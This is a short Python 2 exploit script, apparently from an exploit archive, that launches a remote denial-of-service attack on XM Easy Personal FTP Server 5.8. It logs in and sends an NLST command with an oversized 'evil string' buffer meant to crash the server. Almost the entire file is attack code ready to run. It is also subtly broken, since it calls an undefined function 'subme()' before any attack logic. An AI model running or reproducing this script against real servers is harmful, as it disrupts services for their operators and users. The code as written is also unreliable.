#!/usr/bin/python
print "\n###############################################################"
print "##                  Iranian Pentesters Home                  ##"
print "##                     Www.Pentesters.Ir                     ##"
print "##                    PLATEN -[ H.jafari ]-                  ##"
print "## XM Easy Personal FTP Server 5.8 Remote Denial Of Service  ##"
print "## http://www.dxm2008.com/data/ftpserversetup.exe            ##"
print "## author: PLATEN                                            ##"
print "## E-mail && blog:                                           ##"
print "## hjafari.blogspot.com                                      ##"
print "## platen.secure[at]gmail[dot]com                            ##"
print "## Greetings: Cru3l.b0y, b3hz4d, Cdef3nder                   ##"
print "## and all members in Pentesters.ir                          ##"
print "############################################################### \n"
import socket
import sys

def Usage():
    print ("Usage: ./expl.py <host> <Username> <password>\n")
buffer= "./A" * 6300
subme()
def start(hostname, username, passwd):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((hostname, 21))
    except:
        print ("[-] Connection error!")
        sys.exit(1)
    r=sock.recv(1024)
    print "[+] " + r
    sock.send("user %s\r\n" %username)
    r=sock.recv(1024)
    sock.send("pass %s\r\n" %passwd)
    r=sock.recv(1024)
    print "[+] Send evil string"
    sock.send("nlst %s\r\n" %buffer)
    sock.close()

if len(sys.argv) <> 4:
    Usage()
    sys.exit(1)
else:
    hostname=sys.argv[1]
    username=sys.argv[2]
    passwd=sys.argv[3]
    start(hostname,username,passwd)
    sys.exit(0)